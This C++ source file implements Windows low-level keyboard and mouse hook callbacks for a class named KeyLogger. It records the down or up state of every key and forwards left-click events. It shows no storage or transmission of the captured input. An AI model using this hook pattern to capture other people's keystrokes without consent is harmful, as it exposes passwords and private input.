#include "KeyLoger.hpp"
#include <iostream>

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
	if (code < 0)
		return CallNextHookEx(NULL, code, wParam, lParam);

	KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
	KeyLogger::m_keycodeStatus status;
	if (wParam == WM_KEYDOWN)
	{
		status = KeyLogger::m_keycodeStatus::DOWN;
		KeyLogger::getInstance().setKeyCodeStatus(kbdStruct.vkCode, status);
	}
	else if (wParam == WM_KEYUP)
	{
		status = KeyLogger::m_keycodeStatus::UP;
		KeyLogger::getInstance().setKeyCodeStatus(kbdStruct.vkCode, status);
	}
	else {
		status = KeyLogger::m_keycodeStatus::UNDEFINED;
		KeyLogger::getInstance().setKeyCodeStatus(kbdStruct.vkCode, status);
	}

	KeyLogger::getInstance().onKeyboardEvent(code, wParam, lParam);

	return CallNextHookEx(KeyLogger::getInstance().m_hook, code, wParam, lParam);
}

LRESULT MouseHookFunction(int code, WPARAM wParam, LPARAM lParam) {
	KeyLogger::getInstance().onMouseEvent(code, wParam, lParam);
	return CallNextHookEx(KeyLogger::getInstance().m_hook_mouse, code, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam) {
	if (code == HC_ACTION && (wParam == WM_LBUTTONUP || wParam == WM_LBUTTONDOWN))
	{
		return MouseHookFunction(code, wParam, lParam);
	}
	return CallNextHookEx(KeyLogger::getInstance().m_hook_mouse, code, wParam, lParam);
}